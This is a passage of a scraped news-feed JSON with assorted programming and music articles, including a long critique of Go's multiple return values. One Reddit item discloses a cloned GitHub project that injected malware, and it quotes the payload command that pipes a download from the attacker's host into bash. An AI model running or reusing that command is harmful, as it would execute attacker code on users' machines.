responsibility as an engineer.</strong><a href=\"https://github.com/milanm/DevOps-Roadmap\" rel=\"\">DevOps movement</a></p><p><strong>I still try to understand the system end-to-end, pack as much context into my head as possible, and then pick the most pragmatic solution.</strong></p><p><a href=\"https://newsletter.techworld-with-milan.com/p/my-learnings-from-the-book-a-philosophy\" rel=\"\">keeping interfaces as small as possible</a><strong>I was much more emotionally invested in how systems were built</strong></p><p><strong>distributed systems and databases</strong><strong>large, out-of-sync distributed systems</strong></p><p><strong>Because I/O with the database is almost always the bottleneck for SaaS web dev</strong></p><p><strong>what successfully delivering a project means</strong></p><p><strong>many engineers focus on the “technically strong” part and neglect everything else</strong></p><p><strong>people will (understandably) assume that you’ve covered all the details,</strong><strong>even when you try to communicate otherwise,</strong></p><blockquote><p><em>The only way on earth to influence other people is to talk about what they want and show them how to get it</em></p></blockquote><p><strong>You should work on projects with more junior engineers, and as part of that, you should naturally involve them in your decisions and help them make their own choices</strong></p><p>I’ve seen many junior engineers I’ve worked with grow into strong senior engineers, so it doesn’t seem like I’m holding them back.</p><p><a href=\"https://news.ycombinator.com/\" rel=\"\">—Hacker News</a><a href=\"https://lobste.rs/\" rel=\"\">Lobsters,</a><strong>I make a deliberate effort to do is read the paper behind the article</strong></p><p><strong>writing blogs and code myself is excellent for learning</strong><a href=\"https://github.com/karpathy/nanoGPT\" rel=\"\">Karpathy’s nanogpt</a></p><blockquote><p><em>Learn more about the computer science papers every software engineer should read:</em></p></blockquote><div data-attrs=\"{&quot;id&quot;:153808414,&quot;url&quot;:&quot;https://newsletter.techworld-with-milan.com/p/computer-science-papers-every-developer&quot;,&quot;publication_id&quot;:1219834,&quot;publication_name&quot;:&quot;Tech World With Milan Newsletter&quot;,&quot;publication_logo_url&quot;:&quot;https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fafd6c17b-1bdf-4b80-a7cc-bd216bbe8edb_653x653.png&quot;,&quot;title&quot;:&quot;Computer Science Papers Every Developer Should Read&quot;,&quot;truncated_body_text&quot;:&quot;The foundations of modern software engineering were built on some high-impact research papers. From the algorithms powering most apps today to the databases storing data, many technologies we use daily emerged from academic publications. While these papers might initially seem complex, they offer important insights that can transform your approach to so…&quot;,&quot;date&quot;:&quot;2025-01-16T16:00:38.759Z&quot;,&quot;like_count&quot;:129,&quot;comment_count&quot;:9,&quot;bylines&quot;:[{&quot;id&quot;:24455408,&quot;name&quot;:&quot;Dr Milan Milanović&quot;,&quot;handle&quot;:&quot;techworldwithmilan&quot;,&quot;previous_name&quot;:&quot;Dr. Milan Milanović&quot;,&quot;photo_url&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/3a792453-001b-4564-9b05-3f2323b46763_1280x1124.png&quot;,&quot;bio&quot;:&quot;I'm a CTO writing for a 350k+ community to share my experiences and explore my curiosity. I have more than 20 years of industry experience and a strong scientific background (Ph.D. in Computer Sciences).&quot;,&quot;profile_set_up_at&quot;:&quot;2022-11-30T13:30:12.729Z&quot;,&quot;publicationUsers&quot;:[{&quot;id&quot;:1175459,&quot;user_id&quot;:24455408,&quot;publication_id&quot;:1219834,&quot;role&quot;:&quot;admin&quot;,&quot;public&quot;:true,&quot;is_primary&quot;:false,&quot;publication&quot;:{&quot;id&quot;:1219834,&quot;name&quot;:&quot;Tech World With Milan Newsletter&quot;,&quot;subdomain&quot;:&quot;techworldwithmilan&quot;,&quot;custom_domain&quot;:&quot;newsletter.techworld-with-milan.com&quot;,&quot;custom_domain_optional&quot;:false,&quot;hero_text&quot;:&quot;Insights into a beautiful world of Software Engineering, simplified. \\n\\nJoin his community of 350,000+ readers across different mediums.&quot;,&quot;logo_url&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/afd6c17b-1bdf-4b80-a7cc-bd216bbe8edb_653x653.png&quot;,&quot;author_id&quot;:24455408,&quot;theme_var_background_pop&quot;:&quot;#D10000&quot;,&quot;created_at&quot;:&quot;2022-11-30T20:12:15.007Z&quot;,&quot;email_from_name&quot;:&quot;Dr Milan Milanovic from Tech World With Milan&quot;,&quot;copyright&quot;:&quot;Dr Milan Milanović&quot;,&quot;founding_plan_name&quot;:null,&quot;community_enabled&quot;:true,&quot;invite_only&quot;:false,&quot;payments_state&quot;:&quot;disabled&quot;,&quot;language&quot;:null,&quot;explicit&quot;:false,&quot;is_personal_mode&quot;:false}}],&quot;twitter_screen_name&quot;:&quot;milan_milanovic&quot;,&quot;is_guest&quot;:false,&quot;bestseller_tier&quot;:null}],&quot;utm_campaign&quot;:null,&quot;belowTheFold&quot;:true,&quot;type&quot;:&quot;newsletter&quot;,&quot;language&quot;:&quot;en&quot;}\" data-component-name=\"EmbeddedPostToDOM\"><a native=\"true\" href=\"https://newsletter.techworld-with-milan.com/p/computer-science-papers-every-developer?utm_source=substack&amp;utm_campaign=post_embed&amp;utm_medium=web\" rel=\"\"><div><div>Computer Science Papers Every Developer Should Read</div></div><div>The foundations of modern software engineering were built on some high-impact research papers. From the algorithms powering most apps today to the databases storing data, many technologies we use daily emerged from academic publications. While these papers might initially seem complex, they offer important insights that can transform your approach to so…</div><div>2 months ago · 129 likes · 9 comments · Dr Milan Milanović</div></a></div><p><a href=\"https://www.seangoedecke.com/how-i-use-llms/\" rel=\"\">building around LLM APIs</a></p><p><strong>more than 350,000+ tech professionals</strong></p><ol><li><p><a href=\"https://newsletter.techworld-with-milan.com/p/coaching-services\" rel=\"\">Book a working session with me</a></p></li></ol>","contentLength":5351,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1jc01n4/thinking_like_a_staff_engineer_at_big_tech_with/"},{"title":"Someone copied our GitHub project, made it look more trustworthy by adding stars from many fake users, and then injected malicious code at runtime for potential users.","url":"https://www.reddit.com/r/golang/comments/1jbzuot/someone_copied_our_github_project_made_it_look/","date":1742058511,"author":"/u/_a8m_","guid":366,"unread":true,"content":"<p>Something crazy I found today before it went viral is that someone copied our GitHub project, faked stars for credibility from accounts created just a few weeks ago, and then injected malicious code at runtime for potential users.</p><pre><code>wget -O - https://requestbone.fun/storage/de373d0df/a31546bf | /bin/bash &amp; </code></pre><p>I went over some of the stargazers, and it looks like it was done for other projects too. I expect the impact is much bigger that just our project.</p><p> It's hard to detect the full impact. The attacker obfuscates the code, changing identifiers and scrambling the byte array order, so you can't easily search for it on GitHub. This makes it nearly impossible to track the full impact unless GitHub steps up and helps resolve this issue (I reported these repos to GitHub support).</p>","contentLength":779,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"How many artists' careers did the Beatles kill?","url":"https://www.cantgetmuchhigher.com/p/how-many-artists-did-the-beatles","date":1742058307,"author":"dwighttk","guid":146,"unread":true,"content":"<p>When you ask people about the most consequential years in popular music, there might be no year that comes up more often than 1964. Of course, the most important thing about that year is The Beatles landing in the United States and kicking off the British Invasion. But the year is endlessly discussed because so much else went on. </p><ul><li><p>The Rolling Stones released their debut album</p></li><li><p>Motown became a dominant force in pop music, releasing four number ones, three of which were by The Supremes</p></li><li><p>Bob Dylan dropped two albums</p></li><li><p>The Beach Boys continued their run of hits</p></li></ul><ol><li><p>“Everybody Loves Somebody” by Dean Martin</p></li><li><p>“Where Did Our Love Go” by The Supremes</p></li><li><p>“A Hard Day’s Night” by The Beatles</p></li><li><p>“Rag Doll” by Frankie Valli &amp; the Four Seasons</p></li><li><p>“Under the Boardwalk” by The Drifters</p></li></ol><p>These are five songs that I return to often. And weeks like this weren’t even that rare in 1964. Just one week later, you had the same songs in the top five, except “Rag Doll” was replaced by The Animals’ “House of the Rising Son,” the song that some claim made Dylan go electric and pushed rock music into a completely new direction.</p><p>The one claim that’s always fascinated me about 1964 is that it was a line of demarcation between an old and a new way to make music. If you were making hits in 1963 and didn’t change your sound in 1964, you were going to be waiting tables by the beginning of 1965. In other words, The Beatles-led British Invasion decimated the careers of scores of artists. But was this really the case?</p><p>To do this, I grabbed a list of all 175 acts who released at least one top 40 single in 1963. (Fun fact: the record for the most top 40 hits that year was shared by five acts: Bobby Vinton, Brenda Lee, Dion &amp; the Belmonts, Ray Charles, and The Beach Boys. Each had six top 40 hits.) I then decided to see which of those acts never released a hit in 1964 or any year after. In total, 88 of those 175 acts, or 50%, never had a top 40 hit again. </p><p>That’s kind of a lot. In other words, The Beatles and their fellow invading Brits killed a lot of careers. Or did they? By looking at only a single year we could be biased. And we are.</p><p>If we calculate that same rate for every single year between 1960 and 2020, we see that while the kill rate in 1964 was high, it wasn’t completely out of the ordinary. The median is around 40%. Having a multi-year career as a popular artist is just hard. By looking at the years with the highest rates, we can glean a few other things, though.</p><p>First, three of the top ten rates are 1962, 1963, and 1964. In other words, there is some credence to the theory that the British Invasion decimated many careers. Nevertheless, the fact that the rates in 1962 and 1963 are high tells me that sonic changes were brewing in the United States too. Had The Beatles not arrived, rock music probably still would have evolved in a way that would have left earlier hitmakers in the dust. That sonic evolution would have been different, though.</p><p><a href=\"https://www.theatlantic.com/culture/archive/2015/05/1991-the-most-important-year-in-music/392642/\" rel=\"\">changed their chart methodology</a><a href=\"https://www.cantgetmuchhigher.com/p/does-apple-music-sound-better-than?utm_source=publication-search\" rel=\"\">earlier newsletter</a></p><p>In other words, the 1990s were strange. And I think we are just beginning to grapple with that strangeness. Because of that, there was a ton of turnover on the charts. It’s hard for artists to keep up with trends when grunge, gangsta rap, swing, and a new breed of teen pop are all successful in a matter of years. Being a superstar isn’t easy.</p><p>Aggregating this data got me thinking about which artists have been able to survive the most musical changes and still find success. While there are artists, like Elton John and The Rolling Stones, who put out hits for decades, I want to point out one artist whose resilience still shocks me: Frankie Valli. </p><p>Born in 1934, Valli had his first major hit in 1962 with “Sherry,” a song performed with his group The Four Seasons. Before The Beatles splashed on American shores, Valli and his bandmates had eight more top 40 hits. But they were the kind of group that you’d expect to be decimated by the new sound of rock music. The Four Seasons were sort of a throwback even in 1963, Valli and his falsetto pointing toward the doo-wop of the last decade.</p><p>But Valli and his collaborators forged on. They made some musical missteps but they remained a musical force through 1967, releasing bonafide classics, like “Can’t Take My Eyes Off You.” Okay. So, he survived the British Invasion. Some others did too. But Valli didn’t go quietly as the 1960s came to a close. </p><p>In 1974, he scored a massive hit with “My Eyes Adored You,” a song that played well with the soft rock that was dominant at the time. Then disco began to boom and Valli remained undeterred. “Swearin' to God.” “Who Loves You.” “December, 1963 (Oh, What a Night).” The man could not be stopped.</p><div><p><a href=\"https://open.spotify.com/playlist/13jGfTC2Gm9HUA4HWyil3h?si=c8cd3f977fcc4216\" rel=\"\">A New One</a></p></div><p><em>Alligator Bites Never Heal </em></p><div><p><a href=\"https://open.spotify.com/playlist/5cSaewkxcLhIMv5okk4gzK?si=0b12825cb2d84f44\" rel=\"\">An Old One</a></p></div><p>As I was admiring 1964, I noticed that the week of October 10 had a mind-blowing top five. It included Roy Orbison’s “Oh, Pretty Woman,” Manfred Mann’s “Do Wah Diddy Diddy,” Martha &amp; the Vandellas’ “Dancing in the Street,” and The Shangri-Las’ “Remember (Walkin’ in the Sand).” There was one song that I wasn’t familiar with, though: “Bread and Butter” by The Newbeats.</p><p>“Bread and Butter” is fun, little novelty about bread, butter, toast, jam, and losing your lover. The most notable thing about the song is a half-screamed falsetto that appears periodically throughout the song as performed by Larry Henley. Incidentally, Henley is another good example of musical resilience. After his performing career ended, he wrote a few hits over the decades, including Bette Midler’s massive 1989 ballad “Wind Beneath My Wings.”</p><p><strong>Shout out to the paid subscribers who allow this newsletter to exist. Along with getting access to our entire archive, subscribers unlock biweekly interviews with people driving the music industry, monthly round-ups of the most important stories in music, and priority when submitting questions for our mailbag. Consider becoming a paid subscriber today!</strong></p><p><strong>Want to hear the music that I make? </strong></p>","contentLength":6046,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://news.ycombinator.com/item?id=43373765"},{"title":"Testing PostMarketOS On MS Surface GO 2","url":"https://lemmy.ca/post/40708674","date":1742055927,"author":"/u/giannidunk","guid":379,"unread":true,"content":"<div>Testing Generic x86 edge PostMarketOS with gnome on my MS Surface GO. It's the best linux experience I have had on it. I want to test plasma mobile next.</div>","contentLength":153,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1jbyv46/testing_postmarketos_on_ms_surface_go_2/"},{"title":"call for testing: rust-analyzer!","url":"https://www.reddit.com/r/rust/comments/1jbyunp/call_for_testing_rustanalyzer/","date":1742055893,"author":"/u/thramp","guid":376,"unread":true,"content":"<p>Hi folks! We've landed two big changes in rust-analyzer this past week: - A <a href=\"https://github.com/rust-lang/rust-analyzer/pull/18964\">Salsa upgrade</a>. Today, this should  improve performance, but in the near future, the new Salsa will allow us do features like parallel autocomplete and persistent caches. This work also unblocks us from using the Rust compiler's new trait solver! - Salsa-ification of the <a href=\"https://github.com/rust-lang/rust-analyzer/pull/19337\">crate graph</a>, which changed the unit of incrementality to an individual crate from the entire crate graph. This finer-grained incrementality means that actions that'd previously invalidate the entire crate graph (such as adding/removing a dependency or editing a build script/proc macro) will now cause rust-analyzer to  reindex the changed crate(s),  the entire workspace.</p><p>While we're pretty darn confident in these changes, these are big changes, so we'd appriciate some testing from y'all!</p><p>If you're using Visual Studio Code: 1. Open the \"Extensions\" view () on a Mac;  on other platforms. 2. Find and open the \"rust-analyzer extension\". 3. Assuming it is installed, and click the button that says \"Switch to Pre-Release Version\". VS Code should install a nightly rust-analyzer and prompt you to reload extensions. 4. Let us know if anything's off!</p><h2>Other Editors/Building From Source</h2><p>(Note that rust-analyzer compiles on the latest stable Rust! You do not need a nightly.)</p><ol><li><code>git clone https://github.com/rust-lang/rust-analyzer.git</code>. Make sure you're on the latest commit!</li><li><code>cargo xtask install --server --jemalloc</code>. This will build and place rust-analyzer into into <code>~/.cargo/bin/rust-analyzer</code>.</li><li>Update your your editor to point to that new path. in VS Code, the setting is <code>rust-analyzer.server.path</code>, other editors have some way to override the path. Be sure to point your editor at the  path of <code>~/.cargo/bin/rust-analyzer</code>!</li><li>Restart your editor to make sure it got this configuration change and let us know if anything's off!</li></ol>","contentLength":1858,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Were multiple return values Go's biggest mistake?","url":"https://herecomesthemoon.net/2025/03/multiple-return-values-in-go/","date":1742054834,"author":"/u/SophisticatedAdults","guid":408,"unread":true,"content":"<p><strong>tl;dr: ‘Multiple return values’ in Go interact poorly with other language features. We should probably\n                promote them to full-blown tuple types.</strong></p><p>\n              All of this is normal. Sickos like me  discussing perceived shortcomings of programming\n              languages. It’s nothing personal. I like Go, even, despite its shortcomings.\n            </p><p>\n              My personal candidate for Go’s  historical mistake is that of multiple return values,\n              exactly because of how harmless they look.\n              Multiple return values influenced the design of the language (in bad ways), interact poorly with other\n              features, and <em>make the language much more complex than it has to be</em>.\n            </p><p>Exhibit A, multiple return values:</p><div><pre tabindex=\"0\"><code data-lang=\"go\"></code></pre></div><p>Looking at this, you’d be forgiven for thinking that Go has ’tuples’ (like Python or Rust).</p><p>\n              It doesn’t. There’s no such thing as a ’tuple’. All Go has is a special case syntax which allows functions\n              to return multiple values at the same time. If you want something that sort of behaves like a tuple in Go,\n              you need to define a struct.</p><p>\n              There’s a few other cases of this ‘multiple return values’ behavior special cased for the built-in\n               operator or when accessing a value from a map or channel.\n            </p><div><pre tabindex=\"0\"><code data-lang=\"go\"></code></pre></div><p>\n              What I’m complaining about in this screed is that—as a consequence of putting multiple return values into\n              the language and not making them a dedicated tuple type—Go is in a worse state than it had to be, and that\n              all of this was completely avoidable.\n            </p><p>\n              When I use other languages, I tend to be  that whatever one of my functions spits\n              out, I can put it into a list or vector.\n            </p><p>\n              Through the power of Go, it’s impossible to  pass data around without additional ceremony. I\n              can’t overstate how  it is that in the world of Go, calling a function and being able to\n              store the result in a list is the exception, and not the rule.\n            </p><div><pre tabindex=\"0\"><code data-lang=\"go\"></code></pre></div><p>\n              This (of course) doesn’t compile since  is not a type. Tuples don’t exist. So\n              you  get used to first refactoring all of your functions and defining a whole new struct\n              just to pass some data around. Maybe use two lists? Or a new struct? Amazing.\n            </p><p>This gets significantly more annoying once you try to go concurrent.</p><p>\n              Imagine that you want to spin up some goroutines, have each call\n              <code>func doStuff() (string, error)</code>, and then gather the results. You  pass\n               through a channel since it’s not a standalone type. The usual workaround is\n              to do\n              <a href=\"https://stackoverflow.com/questions/13670818/pair-tuple-data-type-in-go\" target=\"_blank\">whatever this is</a>\n              or to\n              <a href=\"https://herecomesthemoon.net/2025/03/multiple-return-values-in-go/\" target=\"_blank\">define a custom struct</a>:\n            </p><div><pre tabindex=\"0\"><code data-lang=\"go\"></code></pre></div><p>\n              Let me repeat this: Go—a language famous for its concurrency and uncompromising errors-as-values\n              approach—requires you to define a non-standard wrapper type to handle errors as soon as its most basic\n              synchronization primitive is involved or to store  in a slice.\n            </p><p>In other words, <em>Go’s error handling and concurrency don’t compose</em>.</p><p>Hell, even Go’s built-in containers and error handling don’t compose!</p><p>\n              Like many of Go’s problems, it’s something you can work around, but I don’t think that that’s much of an\n              excuse.\n            </p><p>\n              The whole idea behind Go’s error handling is that . You can pass them around\n              like values, inspect them like values, and they’re handled using the same control flow constructs as\n              everything else.\n            </p><p>\n              So despite errors being values, the return of a function call is  not a value at all.\n              You can’t pass it around, you can’t store it.\n            </p><p>\n              A friend of mine has suggested that he believes that “Rob Pike invented Go as a practical joke.”. That’s a\n              pretty rough way too put it, but I can’t entirely blame him? Why would you design a language where the\n              result of a function call cannot be stored or passed around?\n            </p><p>\n              The problem is that this situation was avoidable—if anyone had thought about this in slightly more detail\n              back in the earliest design days—it would’ve been easy to just promote multiple return values to anonymous\n              structs. Instead that time was, presumably, spent adding nonsense like\n              <a href=\"https://go.dev/tour/basics/7\" target=\"_blank\">named return values</a>.\n            </p><p>\n              This is about . Nothing is ‘simple’ about the fact that calling a function doesn’t\n              return a value. It’s a weird idiosyncrasy. By trying to make the language ‘simple’, you played yourself\n              and added a weird edge case.\n            </p><h2>Iterators and ‘Range over Functions’</h2><p>Here’s a basic example of ranging over functions:</p><div><pre tabindex=\"0\"><code data-lang=\"go\"></code></pre></div><p>\n              Just create a constructor function which returns a function which captures variables from the enclosing\n              function scope, and uses them to decide when to call its argument function, thereby determining the\n              behavior of the loop for the end-user. Nothing could possibly be easier. (That’s sarcasm. I find this code\n              hard to read and would’ve preferred an interface-based approach.)\n            </p><p>The Go standard library defines the following types and functions as part of this release:</p><div><pre tabindex=\"0\"><code data-lang=\"go\"></code></pre></div><p>\n              Go cannot handle the case of iterating over one or two values in a uniform, parametrized way. It requires\n              , one for handling one value at a time, and one for two values.\n            </p><div><pre tabindex=\"0\"><code data-lang=\"go\"></code></pre></div><p>\n              Because Go doesn’t have ’tuples’. Why doesn’t Go have tuples? I don’t know—There were\n              <a href=\"https://groups.google.com/g/golang-nuts/c/o8SbEM5GLRw\" target=\"_blank\">some vague discussions in 2009</a>, but it just looks like the Go developers didn’t think of the feature as particularly important. Keeping\n              the language ‘small’ was the higher priority for them.\n            </p><p>\n              Again: This was an attempt to keep the language ‘simple’ which\n              <em>now results in weird, complex edge cases and having to learn twice as many APIs</em>. Congratulations,\n              you tried to simplify and instead just played yourself.\n            </p><p>\n              (Back in the day Go didn’t have generics. Designing a language that interacts poorly with generics under\n              the assumption they’ll never be added was a design tradeoff that probably made sense at the time. Funfact:\n              Go took 5 years until it’s 1.0 release. Rust needed 9 years, and Zig still isn’t there.)\n            </p><p>\n              Take a step back to think about what this means: The designers of the standard library are forced to\n              hardcode specific instances of a type because the language is unable to sufficiently abstract over whether\n              you’re handling one or two values at a time.\n            </p><p>\n              Again: This is not a hard technical problem. There  solutions for this. It’s not even hard if\n              you design a language from the get-go. Go just didn’t implement them.\n            </p><p>\n              Consider what this means for Go’s library ecosystem. If even the standard library easily runs into\n              situations where it’s necessary to <em>work around this limitation</em>, how hard do you think it is a\n              library that does anything slightly fancier? (Again, this limitation extends to error handling, since\n              error handling happens through multiple return values.)\n            </p><p>Warning: Hot opinions ahead, and a bunch of speculation.</p><p>\n              Go’s multiple return value-based error handling was considered to be “good enough”, and prevented the\n              development of a better approach to error handling.\n            </p><p>\n              In reality that could’ve gone either way: The Go developers considered enums and or-operators to be such\n              mysterious, advanced features that there’s no guarantees Go would have ended up with\n              -type based error handling even if multiple return values had never made it into the\n              language.\n            </p><p>For all we know we’d have “Go with exceptions”, which would probably be a step backwards.</p><p>\n              Still: I’ll stand by the fact that multiple return values were a classic ‘worse is better’-type solution\n              that prevented the Go developers from ever  anything even slightly more nuanced,\n              like a\n              <a href=\"https://doc.rust-lang.org/std/result/enum.Result.html\" target=\"_blank\">Result type</a> (aka a sum\n              type purely for error handling, i.e. a value which is either a result  an error).\n            </p><p>\n              Instead, we’re stuck with multiple return values-based error handling. I’m sure you’ve seen people\n              complain about the issues with accidental shadowing of variables. Those make it pretty easy to\n              accidentally forget to check errors. Not a big deal but (once again, this is a running theme here)\n              entirely unnecessary.\n            </p><p>\n              Or taking an example from\n              <a href=\"https://www.dolthub.com/blog/2023-08-16-go-pitfalls/#destructuring-multiple-return-values\" target=\"_blank\">here</a>, that code like this compiles:\n            </p><div><pre tabindex=\"0\"><code data-lang=\"go\"></code></pre></div><p>Or the fact that, no, there’s nothing that stops you from writing functions like this here:</p><div><pre tabindex=\"0\"><code data-lang=\"go\"></code></pre></div><p>Is this bad? Well, it’s by design.</p><p>\n              I am not saying Go’s error handling is . It’s okay. It’s decisively mid-tier, which is a\n              bit embarrassing for a modern green-field project. They had an opportunity to do better than this, and\n              they blew it, and  of these issues are downstream of the decision to standardize on\n              multiple return values as the idiomatic way to handle errors.\n            </p><p>\n              I’ll put my own take on what Go’s error handling should have been like in here since it’s my blog post and\n              you cannot stop me. I’m sure some people will heavily disagree. That’s fine. I think that if Go had\n              standardized around this approach to error handling everyone would’ve gotten used to it.\n            </p><p>\n              Simple, just define a  type that has a  method or operator\n              defined on it that either just passes the value or (if an error is present) wraps it and\n              <em>returns from the function.</em></p><p>\n              You can bikeshed the hell out of this one. Make it a postfix operator instead of a method, if you want.\n              Write  or  to make it stand out more, I don’t care.\n            </p><div><pre tabindex=\"0\"><code data-lang=\"go\"></code></pre></div><ol><li>Vastly better interactions with generics.</li><li>\n                Allows you to store  in slices and pass it around however you please.\n              </li><li>Better for static analysis.</li><li>Less verbose, if you care about that. (I honestly don’t.)</li><li>There’s not even a need for sum types if you don’t want them.</li></ol><p>\n              In practice, it’s too late for invasive changes like that: Go has standardized on multiple return values\n              for error handling, and trying to move away from that would be a fool’s errand.\n            </p><p>\n              Since trying to move towards sum-type-based error handling is a nonstarter unless we want to split the\n              language, let’s ask the obvious question: Is there anything that can be done to improve any of the issues\n              outlined in this post?\n            </p><p>Can we at least promote multiple return values to full blown types and allow generics over them?</p><p>Maybe. That’d be cool. I think it’d be an improvement.</p><p>\n              It’s not entirely trivial though, so let me write down some reasons why it’d be hard, and the changes\n              that’d have to be made.\n            </p><p>\n              You might say “But doesn’t Go have strong backwards compatibility guarantees?” Yeah, it does. That’s what\n              makes it hard. If you could just change stuff however you want, it’d be easy.\n            </p><p>\n              That said, <a href=\"https://go.dev/blog/loopvar-preview\" target=\"_blank\">even Go 1.22</a> made a pretty\n              significant change. You can get pretty far as long as you’re willing to say “Old code will continue to\n              mean exactly what it means today: the fix only applies to new or updated code.”,  you provide\n              tools to auto-fix code during a migration from Go 1.N to Go 1.(N+1).\n            </p><p>In other words, it doesn’t sound impossible.</p><p>\n              In Go, multiple return values are ‘unpacked’ via . This makes the following\n              code syntactically ambiguous due to the optional presence value you can extract from maps:\n            </p><div><pre tabindex=\"0\"><code data-lang=\"go\"></code></pre></div><p>\n              Is this a problem? Eeeeh. It looks like one, but it’s to resolve by just picking one. Since tuples don’t\n              exist in previous versions of Go, old code is just not affected.\n            </p><h4>Multiple Return Value passing</h4><p>Passing multiple return values to a variadic function is currently legal Go code:</p><div><pre tabindex=\"0\"><code data-lang=\"go\"></code></pre></div><p>\n              Does this pass the tuple  to bar as the first argument, or does it automatically unpack\n               to pass the fields as first and second argument?\n            </p><p>\n              Moving away from auto-unpacking would be a breaking change, but if we don’t move away from it then\n              .\n            </p><p>\n              The modern solution to that is pretty simple: First, allow tuples to be unpacked like slices are (i.e. you\n              have to write  to unpack the tuple). Second, add  and\n               commands that identify this issue and fix it when upgrading to the most recent edition\n              of Go.\n            </p><p>\n              Honestly? I thought this would be hard, but as far as language changes go, this seems pretty easy, all\n              things considered.\n            </p><p>\n              If you want to dig deeper into this, you can find\n              <a href=\"https://github.com/golang/go/issues/33080\" target=\"_blank\">a bunch</a> of\n              <a href=\"https://github.com/golang/go/issues/64613\" target=\"_blank\">similar</a> Github\n              <a href=\"https://github.com/golang/go/issues/63221\" target=\"_blank\">issues</a> on these topics. I stumbled\n              upon them when doing research for this blog, I’ve not participated in any of them.\n            </p><p>Maybe I should, though. It would be  to see this one issue finally resolved.</p><p>\n              I don’t know for sure how Go ended up in this weird state with ‘multiple return values’, where it’s\n              impossible to pass function results through a channel or into a slice.\n            </p><p>That one is still baffling to me, so here’s me trying to make sense of it.</p><p>\n              My understanding is that multiple return values were part of Go before its public release. Even in the\n              <a href=\"https://go.dev/doc/devel/weekly\" target=\"_blank\">Weekly Snapshot History</a> that goes all the\n              way back to 2009, there’s only a single mention of multiple return values way back in 2010: “cgo: correct\n              multiple return value function invocations (thanks Christian Himpel)”.</p><p>I imagine the situation played out as follows:</p><p>\n              First of all, multiple return values entered the language . Perhaps via the\n               operator, since someone figured that using a traditional\n              <code>for (int i = 0; i &lt; 100; i++)</code>-style loop just to iterate over the elements of an array or\n              map is too error prone, or perhaps just as a convenience feature.\n            </p><p>\n              Then, the gates of hell opened, demons attacked and the world of programming was set back—no, sorry, I am\n              kidding.\n            </p><p>\n              I assume that what actually happened is that multiple return values were just  and\n              quickly became the idiomatic ‘gold-standard’ for error handling, passing values around, and so on.\n            </p><p>\n              At this point I’m sure that someone asked “Hey, why don’t we just promote those to a full-blown tuple\n              type?”, and was shot down with something like “We already have . There should be a\n              single way of doing things. Go is a simple language. Why would we want to have two features that do the\n              same thing?”\n            </p><p>\n              In either case, at this point multiple return values were here to stay, and the feature established itself\n              as the standard for error handling.\n            </p><p>\n              Looking at the oldest internal discussions in Google’s ‘Golang Nuts’ group (just one or three days after\n              the first\n              <a href=\"https://opensource.googleblog.com/2009/11/hey-ho-lets-go.html\" target=\"_blank\">announcement</a>)\n              is interesting. Say\n              <a href=\"https://groups.google.com/g/golang-nuts/c/TTCaIpSxn2U/m/AQklTsAqi7IJ\" target=\"_blank\">here</a> or\n              <a href=\"https://groups.google.com/g/golang-nuts/c/rvGTZSFU8sY/m/ArU_Ef8Nyl0J\" target=\"_blank\">here</a>. I\n              mean it! Go and take a look. Lines such as “Go doesn’t have nullable types, we haven’t seen a lot of\n              demand for them” really puts things into perspective.\n            </p><p>\n              Give it a few years and we enter the present day, and Go is struggling with some of its earliest design\n              decisions. (Evidence: This entire post. Also,\n              <a href=\"https://github.com/golang/go/issues/49085\" target=\"_blank\">generic methods</a> are still\n              <a href=\"https://go.googlesource.com/proposal/+/refs/heads/master/design/43651-type-parameters.md#No-parameterized-methods\" target=\"_blank\">impossible</a>.)\n            </p><p>\n              Go has these weird special cases (e.g. multiple return values, named return values), decided that ‘and’\n              and ‘or’ are close enough (<a href=\"https://jerf.org/iri/post/2024/go_faq_pipe_in_generics/\" target=\"_blank\">they even made that mistake twice</a>), and many of these problems were <em>intentional design decisions</em> or avoidable.\n            </p><p>\n              The ‘avoidable’ part is a big deal for me. It just feels like a lot of pain could’ve been avoided if Go\n              had spent slightly more time thinking about programming language design.\n            </p><p>\n              Going out on a limb, to me it looks like many of the issues boil down to the question of whether you take\n              types seriously, and are willing to dig into the bare minimum of abstractions to figure out how certain\n              features need to be designed, instead of just making things up as you ™.\n            </p><p>\n              I don’t want to shill for Rust , but one thing that language did well is that it\n               and designed itself around its type system.\n            </p><p> is how it got memory safety without a garbage collector. By\n              <em>moving that information to the type system</em>. This is exactly, intentionally the road that Go\n              didn’t pick.\n            </p><p>\n              Go instead got…multiple return values, which are specifically, intentionally\n              <em>not a type in their own right to keep the language simple</em>. I think this was a bad decision. When\n              it’s easy to codify an abstraction as a type, you  codify it as a type. Go is still\n              learning that lesson today.\n            </p><p>\n              To go out on a positive note—I just spent a whole post complaining about Go, after all—I think that Go is\n              an impressive technical achievement, and set the modern gold standard as far as tooling goes. I am\n              grateful for that. I also really have to respect that its simplicity keeps perfectionism at bay.\n            </p><p>\n              Someday I want to write a post about what I like about Go, but that day is not today. I’ll cross my\n              fingers that tuples are going to be on the list by then.\n            </p>","contentLength":19051,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1jbyghx/were_multiple_return_values_gos_biggest_mistake/"},{"title":"This is what Rust was meant for, right?","url":"https://github.com/giacomo-b/rust-stakeholder","date":1742054422,"author":"/u/jackraddit","guid":378,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1jbyatf/this_is_what_rust_was_meant_for_right/"},{"title":"Fired “Kill Switch” Programmer Faces 10 Years In Jail: What Went Wrong?","url":"https://programmers.fyi/fired-kill-switch-programmer-faces-10-years-in-jail-what-went-wrong","date":1742053967,"author":"/u/derjanni","guid":410,"unread":true,"content":"<p>The 55 year old Texan Davis Lu was just <a 